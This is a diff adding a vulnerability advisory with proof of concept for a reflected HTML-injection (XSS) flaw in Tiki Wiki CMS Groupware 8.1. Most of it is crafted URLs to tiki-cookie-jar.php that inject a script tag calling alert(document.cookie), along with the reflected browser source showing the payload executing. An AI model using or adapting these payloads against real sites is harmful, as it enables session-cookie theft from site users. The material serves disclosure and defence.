@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/51128/info
+
+Tiki Wiki CMS Groupware is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible. 
+
+Tested with Firefox 7.01
+
+Visit this URL
+
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&xss=</style></script><script>alert(document.cookie)</script> -> blank site
+
+But when you visit one of this pages, the XSS will be executed
+
+http://www.example.com/tiki-8.1/tiki-login.php
+http://www.example.com/tiki-8.1/tiki-remind_password.php
+
+// browser source code
+
+show_errors: &#039;y&#039;,
+		xss: &#039;</style></script><script>alert(document.cookie)</script>&#039;
+};
+
+Another example:
+
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&xss1=</style></script><script>alert(document.cookie)</script>
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&xss2=</style></script><script>alert(document.cookie)</script>
+http://www.example.com/tiki-8.1/tiki-cookie-jar.php?show_errors=y&xss3=</style></script><script>alert(document.cookie)</script>
+
+All of them will be executed!
+
+// browser source code
+
+show_errors: &#039;y&#039;,
+	xss1: &#039;</style></script><script>alert(document.cookie)</script>&#039;,
+	xss2: &#039;</style></script><script>alert(document.cookie)</script>&#039;,
+	xss3: &#039;</style></script><script>alert(document.cookie)</script>&#039;
+};
+
+
